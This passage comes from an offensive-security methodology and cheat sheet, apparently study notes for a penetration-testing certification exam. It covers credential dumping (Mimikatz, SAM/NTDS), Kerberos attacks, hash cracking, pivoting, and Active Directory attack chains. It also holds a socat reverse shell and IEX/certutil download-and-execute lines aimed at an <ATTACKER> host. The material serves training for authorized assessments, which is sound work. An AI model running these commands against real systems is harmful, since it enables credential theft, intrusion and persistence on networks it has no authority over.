  │     ├── Mimikatz (if admin on host):
  │     │     privilege::debug
  │     │     sekurlsa::logonpasswords    ← Dump ALL credentials from memory
  │     │     sekurlsa::wdigest          ← WDigest passwords
  │     │     lsadump::sam               ← Dump SAM
  │     │     lsadump::dcsync /user:krbtgt  ← DCSync (if DA)
  │     │     kerberos::list /export     ← Export tickets
  │     │
  │     ├── Rubeus (Kerberos attacks from Windows):
  │     │     Rubeus.exe asreproast /outfile:hashes.txt
  │     │     Rubeus.exe kerberoast /outfile:hashes.txt
  │     │     Rubeus.exe dump /service:krbtgt
  │     │     Rubeus.exe ptt /ticket:<base64>
  │     │     Rubeus.exe s4u /user:<user> /rc4:<hash> /impersonateuser:administrator /msdsspn:cifs/<target> /ptt
  │     │
  │     ├── Saved credentials: cmdkey /list
  │     ├── SAM/SYSTEM hives (password hashes):
  │     │     reg save hklm\sam sam
  │     │     reg save hklm\system system
  │     │     secretsdump.py -sam sam -system system LOCAL
  │     │
  │     ├── NTDS.dit (domain hashes from DC):
  │     │     ntdsutil → "activate instance ntds" → "ifm" → "create full C:\ntds_dump"
  │     │     secretsdump.py -ntds ntds.dit -system system.hive LOCAL
  │     │
  │     ├── Browser saved passwords
  │     ├── RDP saved connections
  │     ├── SSH keys in C:\Users\*\.ssh\
  │     ├── WiFi passwords: netsh wlan show profiles
  │     ├── Search for passwords in files:
  │     │     findstr /si "password" C:\Users\* 2>nul
  │     │     findstr /si "password" C:\inetpub\* 2>nul
  │     │
  │     └── Snaffler (find credentials in file shares):
  │           Snaffler.exe -s -d <domain> -c <DC_IP>
  │
  └─► Password cracking:
        ├── NTLM hashes: hashcat -m 1000 hashes.txt rockyou.txt
        ├── NetNTLMv2: hashcat -m 5600 hashes.txt rockyou.txt
        ├── Kerberos TGS: hashcat -m 13100 hashes.txt rockyou.txt
        ├── Kerberos AS-REP: hashcat -m 18200 hashes.txt rockyou.txt
        ├── SHA-512 (Linux): hashcat -m 1800 hashes.txt rockyou.txt
        ├── MD5 (Linux): hashcat -m 0 hashes.txt rockyou.txt
        ├── SHA-256 (Linux): hashcat -m 7400 hashes.txt rockyou.txt
        └── bcrypt: hashcat -m 3200 hashes.txt rockyou.txt
```

---

## Phase 6: Lateral Movement & Pivoting

```
ROOT/SYSTEM ACCESS OBTAINED ON ONE HOST
  │
  ├─► STEP 1: Pillaging (gather everything!) ──► See 5D above
  │
  ├─► STEP 2: Network discovery from compromised host
  │     │
  │     ├── LINUX:
  │     │     ip route / ifconfig
  │     │     cat /etc/hosts
  │     │     arp -a
  │     │     for i in $(seq 1 254); do ping -c 1 10.10.10.$i & done
  │     │
  │     └── WINDOWS:
  │           ipconfig /all
  │           route print
  │           arp -a
  │           net view /domain
  │
  ├─► STEP 3: Pivoting (if internal networks discovered)
  │     │
  │     ├── SSH tunneling:
  │     │     # Local port forward:
  │     │     ssh -L <local_port>:<internal_host>:<internal_port> user@<pivot_host>
  │     │     # Dynamic (SOCKS proxy):
  │     │     ssh -D 9050 user@<pivot_host>
  │     │     # Remote port forward:
  │     │     ssh -R <remote_port>:<internal_host>:<internal_port> user@<attack_host>
  │     │
  │     ├── Chisel (for when SSH not available):
  │     │     # Attack machine (server):
  │     │     chisel server --reverse -p 8080
  │     │     # Target machine (client):
  │     │     chisel client <ATTACKER>:8080 R:socks
  │     │     # OR specific port forward:
  │     │     chisel client <ATTACKER>:8080 R:8888:<internal_host>:80
  │     │
  │     ├── Metasploit routing:
  │     │     # In meterpreter:
  │     │     run autoroute -s <internal_subnet>
  │     │     # Then use modules through the pivot
  │     │
  │     └── Proxychains:
  │           # /etc/proxychains4.conf → socks5 127.0.0.1 9050
  │           proxychains nmap -sT <internal_host>
  │           proxychains crackmapexec smb <internal_subnet>
  │
  ├─► STEP 4: Active Directory Lateral Movement
  │     │
  │     ├── Have domain credentials?
  │     │     │
  │     │     ├── YES ──►
  │     │     │     ├── crackmapexec smb <subnet> -u user -p pass
  │     │     │     ├── Check admin access to other hosts:
  │     │     │     │     crackmapexec smb <subnet> -u user -p pass --local-auth
  │     │     │     ├── psexec.py for shell on other hosts:
  │     │     │     │     psexec.py <domain>/user:pass@<IP>
  │     │     │     ├── wmiexec.py (stealthier):
  │     │     │     │     wmiexec.py <domain>/user:pass@<IP>
  │     │     │     ├── evil-winrm:
  │     │     │     │     evil-winrm -i <IP> -u user -p pass
  │     │     │     └── RDP:
  │     │     │           xfreerdp /v:<IP> /u:user /p:pass
  │     │     │
  │     │     └── NO ──►
  │     │           ├── Dump hashes from current host
  │     │           ├── secretsdump.py <domain>/<user>:<pass>@<IP>
  │     │           └── Use hashes for pass-the-hash
  │     │
  │     ├── Pass-the-Hash:
  │     │     crackmapexec smb <IP> -u user -H <NTLM_HASH>
  │     │     psexec.py -hashes <LM>:<NTLM> <domain>/user@<IP>
  │     │     evil-winrm -i <IP> -u user -H <NTLM_HASH>
  │     │
  │     ├── Kerberoasting → Crack → Lateral movement
  │     │     GetUserSPNs.py <domain>/<user>:<pass> -request
  │     │     hashcat -m 13100 hash.txt rockyou.txt
  │     │
  │     ├── AS-REP Roasting:
  │     │     GetNPUsers.py <domain>/ -usersfile users.txt
  │     │
  │     ├── Constrained Delegation (S4U):
  │     │     # With Rubeus:
  │     │     Rubeus.exe s4u /user:<service_account> /rc4:<hash> /impersonateuser:administrator /msdsspn:<service>/<target> /ptt
  │     │     # With Impacket:
  │     │     getST.py -spn <service>/<target> -impersonate administrator <domain>/<service_account>:<pass>
  │     │
  │     └── DCSync (if Domain Admin):
  │           secretsdump.py <domain>/<admin>:<pass>@<DC_IP>
  │           └── Dump ALL domain hashes!
  │
  ├─► STEP 5: Advanced Pivoting Tools (when SSH/Chisel aren't enough)
  │     │
  │     ├── Ligolo-ng (TUN interface — best for full network access):
  │     │     # Attack machine (proxy):
  │     │     ./ligolo-proxy -selfcert
  │     │     # Target machine (agent):
  │     │     ./ligolo-agent -connect <ATTACKER>:11601 -ignore-cert
  │     │     # On proxy: session → ifcreate → ifconfig
  │     │     # Gives full TUN access — can use any tool without proxychains!
  │     │
  │     ├── rpivot (reverse SOCKS proxy via HTTP):
  │     │     # Attack machine (server):
  │     │     python2 server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
  │     │     # Target machine (client):
  │     │     python2 client.py --server-ip <ATTACKER> --server-port 9999
  │     │     # Works through HTTP proxies — good for egress filtering
  │     │
  │     ├── dnscat2 (DNS tunneling — bypasses strict firewalls):
  │     │     # Attack machine (server):
  │     │     ruby ./dnscat2.rb <domain> --secret=<key>
  │     │     # Windows target (PowerShell client):
  │     │     Import-Module dnscat2.ps1
  │     │     Start-Dnscat2 -Domain <domain> -DNSServer <DNS_IP> -PreSharedSecret <key>
  │     │     # Extremely stealthy — uses DNS TXT records
  │     │
  │     ├── ptunnel-ng (ICMP tunneling):
  │     │     # When only ICMP (ping) is allowed out
  │     │     sudo ./ptunnel-ng -p<ATTACKER> -l2222 -r<target_ip> -R22
  │     │     # Then: ssh -p 2222 user@localhost
  │     │
  │     └── Socat (port forwarding / relay):
  │           # Simple port forward:
  │           socat TCP-LISTEN:8080,fork TCP:<internal_host>:80
  │           # Encrypted tunnel:
  │           socat OPENSSL-LISTEN:443,cert=server.pem,fork TCP:localhost:8080
  │
  └─► STEP 6: For each new host ──► Go back to Phase 1
        (Enumeration is ITERATIVE!)
```

---

## Phase 7: Documentation & Reporting

```
ASSESSMENT COMPLETE
  │
  ├─► STEP 1: Clean up
  │     ├── Remove uploaded tools and payloads
  │     ├── Remove added users
  │     ├── Remove cron jobs / scheduled tasks
  │     ├── Remove registry modifications
  │     └── Revert any system changes
  │
  ├─► STEP 2: Document findings
  │     For EACH finding:
  │     ├── Title & Severity (Critical/High/Medium/Low)
  │     ├── Description of the vulnerability
  │     ├── Impact (what could an attacker do?)
  │     ├── Steps to reproduce (numbered, detailed)
  │     ├── Evidence (screenshots, command output)
  │     ├── Remediation recommendations (specific, actionable)
  │     └── References (CVEs, URLs)
  │
  ├─► STEP 3: Create attack chain narrative
  │     └── Show how vulnerabilities chain together
  │           "Finding A → led to Finding B → which enabled Finding C → Domain Admin"
  │
  ├─► STEP 4: Reporting Golden Rules
  │     ├── Executive Summary: NO technical jargon. Focus on IMPACT
  │     │     (e.g., "Access to HR documents" not "Domain Admin")
  │     ├── Attack Chain: Tell a story
  │     ├── Redaction: Use SOLID BLACK BARS, NOT pixelation/blurring
  │     ├── Cleanup: List every file uploaded and every account created
  │     └── QA: Read your own report once over to catch typos
  │
  ├─► STEP 5: Deliverables
  │     ├── Executive summary (for management)
  │     ├── Technical report (for IT team)
  │     ├── Raw scan data (appendix)
  │     └── Proof-of-concept scripts (if applicable)
  │
  └─► STEP 6: Notetaking & Logging Best Practices
        ├── Save ALL scan results: nmap -oA, gobuster -o
        ├── Log all commands and output
        ├── Take screenshots of EVERY proof
        │     ├── whoami / id in EVERY proof
        │     ├── hostname in EVERY proof
        │     └── ipconfig / ifconfig in EVERY proof
        ├── Keep track of credentials found
        └── Document as you go — Don't leave reporting to the end
```

---

## Quick Reference Cheat Sheets

### Shell Upgrade Cheat Sheet

```bash
# Python TTY upgrade
python3 -c 'import pty;pty.spawn("/bin/bash")'
# OR: python -c 'import pty;pty.spawn("/bin/bash")'
Ctrl+Z
stty raw -echo; fg
export TERM=xterm
export SHELL=/bin/bash

# Script fallback (no Python)
script /dev/null -c bash

# Socat full TTY (if socat available on target)
# On attack machine:
socat file:`tty`,raw,echo=0 tcp-listen:4444
# On target:
socat exec:'bash -li',pty,stderr,setsid,sigint,suspend tcp:<ATTACKER>:4444
```

### File Transfer Cheat Sheet

**Linux → Attack Machine:**
```bash
# HTTP server on attack machine:
python3 -m http.server 80

# Download on target:
wget http://<ATTACKER>/file
curl http://<ATTACKER>/file -o file

# Or via /dev/tcp (if no wget/curl):
exec 3<>/dev/tcp/<ATTACKER>/80
echo -e "GET /file HTTP/1.1\r\n\r\n" >&3
cat <&3
```

**Windows → Attack Machine:**
```powershell
# PowerShell download:
(New-Object Net.WebClient).DownloadFile('http://<ATTACKER>/file.exe','C:\Windows\Temp\file.exe')

# Certutil:
certutil -urlcache -split -f http://<ATTACKER>/file.exe file.exe

# SMB transfer:
# On attack machine: impacket-smbserver share /tmp/smbshare -smb2support
copy \\<ATTACKER>\share\file.exe file.exe

# PowerShell IEX (fileless):
IEX(New-Object Net.WebClient).DownloadString('http://<ATTACKER>/script.ps1')

# BitsAdmin:
bitsadmin /transfer n http://<ATTACKER>/file.exe C:\Windows\Temp\file.exe
```

### Password Cracking Quick Reference

| Hash Type | Hashcat Mode | Example Command |
|-----------|-------------|-----------------|
| MD5 | 0 | `hashcat -m 0 hash.txt rockyou.txt` |
| SHA-1 | 100 | `hashcat -m 100 hash.txt rockyou.txt` |
| SHA-256 | 1400 | `hashcat -m 1400 hash.txt rockyou.txt` |
| SHA-512 (Linux) | 1800 | `hashcat -m 1800 hash.txt rockyou.txt` |
| bcrypt | 3200 | `hashcat -m 3200 hash.txt rockyou.txt` |
| NTLM | 1000 | `hashcat -m 1000 hash.txt rockyou.txt` |
| NetNTLMv2 | 5600 | `hashcat -m 5600 hash.txt rockyou.txt` |
| Kerberos TGS | 13100 | `hashcat -m 13100 hash.txt rockyou.txt` |
| Kerberos AS-REP | 18200 | `hashcat -m 18200 hash.txt rockyou.txt` |
| MSSQL | 1731 | `hashcat -m 1731 hash.txt rockyou.txt` |
| IPMI | 7300 | `hashcat -m 7300 hash.txt rockyou.txt` |
| MySQL | 300 | `hashcat -m 300 hash.txt rockyou.txt` |
| PostgreSQL | 11100 | `hashcat -m 11100 hash.txt rockyou.txt` |
| SHA-256 (Unix) | 7400 | `hashcat -m 7400 hash.txt rockyou.txt` |

### Port-by-Port Quick Reference

| Port | Service | First Action | Key Attack Vectors |
|------|---------|-------------|-------------------|
| 21 | FTP | `ftp <IP>` → try anonymous | Anonymous login, version exploits, upload web shell |
| 22 | SSH | `nc -nv <IP> 22` (banner) | Credentials from other services, key reuse, brute force |
| 25 | SMTP | `smtp-user-enum` | User enumeration, phishing |
| 53 | DNS | `dig axfr @<IP> <domain>` | Zone transfer, subdomain enum |
| 80/443 | HTTP/S | `whatweb`, `curl -IL`, visit in browser | Full web attack tree |
| 110/995 | POP3 | `telnet <IP> 110` | Credential brute force |
| 139/445 | SMB | `smbclient -N -L`, `crackmapexec smb` | Shares, EternalBlue, credentials, user enum |
| 161 | SNMP | `snmpwalk -v 2c -c public` | Process creds, software, network info |
| 389/636 | LDAP | `ldapsearch -x -H ldap://<IP>` | AD enumeration, users, groups |
| 88 | Kerberos | `kerbrute userenum` | AS-REP roast, Kerberoast, user enum |
| 1433 | MSSQL | `mssqlclient.py` | xp_cmdshell, credentials, linked servers |
| 3306 | MySQL | `mysql -u root -p` | INTO OUTFILE, credentials |
| 3389 | RDP | `xfreerdp /v:<IP>` | Credential attacks, BlueKeep |
| 623 | IPMI | `nmap -sU -p 623 --script ipmi-version` | Hash dump (RAKP flaw), default creds, BMC access |
| 1521 | Oracle TNS | `./odat.py tnscmd -s <IP>` | SID guess, default creds, ODAT RCE, SMB relay |
| 2049 | NFS | `showmount -e <IP>` | Mount shares, no_root_squash |
| 5432 | PostgreSQL | `psql -U postgres -h <IP>` | COPY RCE, read files, credentials |
| 5900 | VNC | `nc -nv <IP> 5900` | Default creds, brute force, registry password |

### Active Directory Attack Order Quick Reference

```
AD ENVIRONMENT DETECTED
  │
  ├─► 1. Enumerate domain info
  │     crackmapexec smb <IP>
  │     ldapsearch -x -H ldap://<IP>
  │
  ├─► 2. Start Responder (LLMNR/NBT-NS poisoning)
  │     sudo responder -I <interface> -dwf
  │
  ├─► 3. User enumeration
  │     kerbrute userenum --dc <IP> -d <domain> users.txt
  │     rpcclient -U "" <IP> -c "enumdomusers"
  │     enum4linux -a <IP>
  │
  ├─► 4. AS-REP Roasting (no auth needed!)
  │     GetNPUsers.py <domain>/ -usersfile users.txt -dc-ip <IP>
  │     ├── Crack hash: hashcat -m 18200 hash.txt rockyou.txt
  │     └── Use cracked password for access
  │
  ├─► 5. Password spraying
  │     crackmapexec smb <subnet> -u users.txt -p 'Spring2024!'
  │     kerbrute passwordspray -d <domain> --dc <IP> users.txt 'Spring2024!'
  │
  ├─► 6. Kerberoasting (need ANY valid creds)
  │     GetUserSPNs.py <domain>/<user>:<pass> -request
  │     ├── Crack TGS: hashcat -m 13100 hash.txt rockyou.txt
  │     └── Use cracked service account password
  │
  ├─► 7. BloodHound analysis (with valid creds)
  │     bloodhound-python -u user -p pass -d <domain> -c All -ns <DC_IP>
  │     ├── Find path to Domain Admins
  │     ├── Check ACL abuse paths
  │     └── Check delegation paths
  │
  ├─► 8. ACL attacks (based on BloodHound findings)
  │     ├── GenericAll → Reset password / add to group
  │     ├── WriteDacl → Grant GenericAll → Reset password
  │     ├── ForceChangePassword → Change it
  │     └── GenericAll on Computer → Shadow Credentials
  │
  ├─► 9. Lateral movement with obtained creds
  │     crackmapexec smb <subnet> -u user -p pass
  │     evil-winrm -i <IP> -u user -p pass
  │     psexec.py <domain>/user:pass@<IP>
  │     wmiexec.py <domain>/user:pass@<IP>
  │
  ├─► 10. Privilege escalation on new host
  │     ├── Run winPEAS
  │     ├── Check for SeImpersonatePrivilege
  │     ├── Run Mimikatz / dump SAM
  │     └── Check for stored credentials
  │
  ├─► 11. Domain Admin obtained?
  │     ├── YES ──► DCSync attack
  │     │     secretsdump.py <domain>/<admin>:<pass>@<DC_IP>
  │     │     └── Dump ALL domain hashes
  │     │
  │     └── NO ──► Go back to step 7 with new credentials
  │
  └─► 12. Persistence (if needed)
        ├── Add domain admin account
        ├── Golden ticket attack (need krbtgt hash)
        └── Silver ticket attack (need service hash)
```

### Linux Privilege Escalation Quick Wins

```
1.  sudo -l                    ← #1 most important check
2.  find / -perm -4000 2>/dev/null   ← SUID binaries → GTFOBins
3.  cat /etc/crontab            ← Cron jobs
4.  getcap -r / 2>/dev/null    ← Capabilities
5.  ss -tlnp                   ← Internal services
6.  find / -writable -type d 2>/dev/null  ← Writable dirs
7.  cat /etc/exports           ← NFS shares
8.  id                         ← Current user/groups
9.  uname -a                   ← Kernel version
10. grep -ri password /home/ 2>/dev/null  ← Passwords in files
11. find / -name id_rsa 2>/dev/null      ← SSH keys
12. cat .bash_history          ← Command history
13. env                        ← Environment variables
14. find / -name "*.conf" 2>/dev/null | xargs grep -i password
15. docker images              ← Docker escape
```

### Windows Privilege Escalation Quick Wins

```
1.  whoami /priv               ← #1 most important check (SeImpersonate?)
2.  whoami /groups              ← Group membership
3.  systeminfo                  ← OS version, hotfixes
4.  net user                    ← User list
5.  net localgroup administrators  ← Admin users
6.  cmdkey /list                ← Saved credentials
7.  reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"  ← Auto-logon
8.  reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
9.  wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"  ← Unquoted paths
10. findstr /si "password" *.txt *.ini *.xml *.config 2>nul  ← Passwords in files
11. netstat -ano                ← Internal services
12. schtasks /query /fo LIST /v  ← Scheduled tasks
13. net localgroup "DnsAdmins"  ← DNS Admins group
14. reg query HKLM /f password /t REG_SZ /s  ← Registry passwords
15. type C:\Users\*\.ssh\id_rsa  ← SSH keys
```

### The "I'm Stuck" Loop

```
STUCK? Follow this checklist:
  │
  ├─► 1. Re-enumerate: Did you miss a port? A sub-directory? A parameter?
  ├─► 2. Check configs: wp-config.php, web.config, .env, *.conf
  ├─► 3. Check local ports: ss -tlnp / netstat -ano (internal services?)
  ├─► 4. Try fallbacks: If psexec fails, try wmiexec. If wget fails, try certutil.
  ├─► 5. Check for credentials everywhere: files, history, environment, registry
  ├─► 6. Re-run automated tools: LinPEAS/WinPEAS may have missed something
  ├─► 7. Check BloodHound again: Look for different attack paths
  ├─► 8. Try password reuse: Use found credentials on ALL services
  ├─► 9. Check for internal web apps: Forward ports and enumerate
  └─► 10. Read module notes again: You may have missed a technique
```

---

## 🎯 EXAM DAY REMINDERS

1. **ENUMERATE TWICE, EXPLOIT ONCE** — Rushing leads to missed paths
2. **Save ALL scan results** — `nmap -oA`, `gobuster -o`
3. **Check EVERY service** — Don't skip "unimportant" ports
4. **Try credentials everywhere** — Password reuse is REAL
5. **If stuck, re-enumerate** — You probably missed something
6. **Upgrade your shell immediately** — Full TTY makes everything easier
7. **Check for internal services** — `ss -tlnp` / `netstat -ano`
8. **LinPEAS/WinPEAS first** — Then manual enumeration
9. **GTFOBins is your best friend** — For sudo/SUID exploitation
10. **Document as you go** — Don't leave reporting to the end
11. **Start Responder immediately** — Passive hash capture while you work
12. **BloodHound is mandatory** — Run it as soon as you have ANY creds
13. **Check for AD attacks FIRST** — AS-REP Roast, Kerberoast, Password Spray
14. **Try Pass-the-Hash** — If you have NTLM hash, you don't need a password
15. **Flags: exact strings** — No trailing spaces, copy carefully

---

*Methodology created from comprehensive analysis of all 27 CPTS Academy modules.*